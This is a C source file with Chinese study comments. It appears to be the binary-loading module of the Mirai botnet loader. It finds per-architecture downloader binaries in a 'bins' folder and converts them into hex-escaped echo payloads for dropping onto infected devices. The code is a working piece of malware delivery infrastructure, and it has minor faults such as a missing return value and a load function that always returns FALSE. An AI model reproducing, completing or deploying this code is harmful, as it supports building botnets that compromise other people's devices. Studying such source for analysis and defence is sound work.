#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <glob.h>
#include "headers/includes.h"
#include "headers/binary.h"

static int bin_list_len = 0;
static struct binary **bin_list = NULL;

//检查平台的架构，从bin目录中选择名称合适的架构文件，并移交给load函数
BOOL binary_init(void)
{
    glob_t pglob;
    int i;
    // 匹配bins目录下的所有的dlr开头的文件
    if (glob("bins/dlr.*", GLOB_ERR, NULL, &pglob) != 0)
    {
        printf("Failed to load from bins folder!\n");
        return;
    }
    // 遍历上述得到的文件
    for (i = 0; i < pglob.gl_pathc; i++)
    {
        char file_name[256];
        struct binary *bin;

        bin_list = realloc(bin_list, (bin_list_len + 1) * sizeof (struct binary *));
        bin_list[bin_list_len] = calloc(1, sizeof (struct binary));
        bin = bin_list[bin_list_len++];

#ifdef DEBUG
        printf("(%d/%d) %s is loading...\n", i + 1, pglob.gl_pathc, pglob.gl_pathv[i]);
#endif
        // 保存文件的路径和文件的架构
        strcpy(file_name, pglob.gl_pathv[i]);
        strtok(file_name, ".");
        // 得到文件的拓展名（架构名称）
        strcpy(bin->arch, strtok(NULL, "."));
        load(bin, pglob.gl_pathv[i]);
    }

    globfree(&pglob);
    return TRUE;
}
// 返回特定架构的文件结构体，失败返回NULL
struct binary *binary_get_by_arch(char *arch)
{
    int i;

    for (i = 0; i < bin_list_len; i++)
    {
        if (strcmp(arch, bin_list[i]->arch) == 0)
            return bin_list[i];
    }

    return NULL;
}
//将binary确定的平台架构文件，读取到内存中
// #define BINARY_BYTES_PER_ECHOLINE   128

static BOOL load(struct binary *bin, char *fname)
{
    FILE *file;
    char rdbuf[BINARY_BYTES_PER_ECHOLINE];
    int n;

    if ((file = fopen(fname, "r")) == NULL)
    {
        printf("Failed to open %s for parsing\n", fname);
        return FALSE;
    }
// #define BINARY_BYTES_PER_ECHOLINE   128
// 从file文件种读取128字节，按照char类型，放到rdbuf缓冲区中。n是读取到的字节数
    while ((n = fread(rdbuf, sizeof (char), BINARY_BYTES_PER_ECHOLINE, file)) != 0)
    {
        char *ptr;
        int i;
        // realloc（调整之前的内容空间） 扩充payload内存空间。
        bin->hex_payloads = realloc(bin->hex_payloads, (bin->hex_payloads_len + 1) * sizeof (char *));
        // calloc申请一个新的字符串内存,每个字节的16进制表示需要4个字符（00 -> \x00）,再加上结尾空字节
        bin->hex_payloads[bin->hex_payloads_len] = calloc(sizeof (char), (4 * n) + 8);
        // 将新字符串内存首地址保存到ptr指针
        ptr = bin->hex_payloads[bin->hex_payloads_len++];

        for (i = 0; i < n; i++)
            ptr += sprintf(ptr, "\\x%02x", (uint8_t)rdbuf[i]);
            // \\x表示16进制,\\02x表示2位宽度,0填充
    }       

    return FALSE;
}
